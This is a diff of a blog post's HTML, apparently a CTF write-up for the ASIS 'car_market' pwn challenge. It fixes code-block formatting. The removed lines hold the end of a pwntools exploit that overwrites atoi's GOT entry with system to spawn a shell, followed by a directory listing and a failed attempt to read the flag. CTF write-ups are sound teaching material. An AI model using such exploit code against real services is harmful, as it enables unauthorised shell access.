-r.sendlineafter("</span><span class="p">&gt;\</span><span class="n">n</span><span class="s2">", "</span><span class="m">5</span><span class="s2">") # exit select car menu
-
-# overwrite atoi's got
-log.info("</span><span class="n">overwriting</span> <span class="n">atoi</span><span class="s1">'s got...")
-r.sendlineafter("&gt;\n", "4") # select car
-r.sendlineafter("index\n", "14") # input index
-r.sendlineafter("&gt;\n", "2") # set model (atoi'</span><span class="n">s</span> <span class="n">got</span><span class="p">)</span>
-<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">"model</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="nf">system</span><span class="p">))</span>
-<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">"sh\x00"</span><span class="p">)</span>
-
-<span class="nb">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s2">"get shell !"</span><span class="p">)</span>
-<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
-</code></pre></div></div>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  
-After I finished the exploit, I found it once again, the exploit has timeout due to the crappy internet connection. So I upload the exploit to trello and ask **freetsubasa** if she can send the payload for me. And then she told me that **she had the shell spawned, but she can't find the flag.** What ?  
-</code></pre></div></div>
-<p>$ ls -la
+<p>After I finished the exploit, I found it once again, the exploit has timeout due to the crappy internet connection. So I upload the exploit to trello and ask <strong>freetsubasa</strong> if she can send the payload for me. And then she told me that <strong>she had the shell spawned, but she can’t find the flag.</strong> What ?</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ls -la
 total 40
-drwxr-x— 2 root marketpwn  4096 Sep  8 10:02 .
+drwxr-x--- 2 root marketpwn  4096 Sep  8 10:02 .
 drwxr-xr-x 3 root root       4096 Sep  8 09:51 ..
 lrwxrwxrwx 1 root marketpwn     9 Sep  8 09:59 .bash_history -&gt; /dev/null
--rw-r–r– 1 root marketpwn   220 Sep  8 09:51 .bash_logout
--rw-r–r– 1 root marketpwn  3771 Sep  8 09:51 .bashrc
+-rw-r--r-- 1 root marketpwn   220 Sep  8 09:51 .bash_logout
+-rw-r--r-- 1 root marketpwn  3771 Sep  8 09:51 .bashrc
 -rwxr-xr-x 1 root marketpwn 10504 Sep  8 09:56 car_market
--r–r—– 1 root marketpwn    39 Sep  8 09:57 ._flag
--rw-r–r– 1 root marketpwn   655 Sep  8 09:51 .profile
--rwxr-xr-x 1 root marketpwn   104 Sep  8 09:56 wrapper.sh</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>OK, so the ASIS organizer try to play some trick on us. It's alright, no big deal, just give us the flag so we can pass the challenge.  
+-r--r----- 1 root marketpwn    39 Sep  8 09:57 ._flag
+-rw-r--r-- 1 root marketpwn   655 Sep  8 09:51 .profile
+-rwxr-xr-x 1 root marketpwn   104 Sep  8 09:56 wrapper.sh
 </code></pre></div></div>
-<p>$ cat ._flag
+<p>OK, so the ASIS organizer try to play some trick on us. It’s alright, no big deal, just give us the flag so we can pass the challenge.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cat ._flag
 cat: ._flag: No such file or directory
-```
-WHAT. THE. F*CK.</p>
+</code></pre></div></div>
+<p>WHAT. THE. F*CK.</p>
 
 <p>How is this even possible? The file is just right there and now you’re telling me the file does not exist? This is bullsh*t !@#$%^&amp;</p>
 
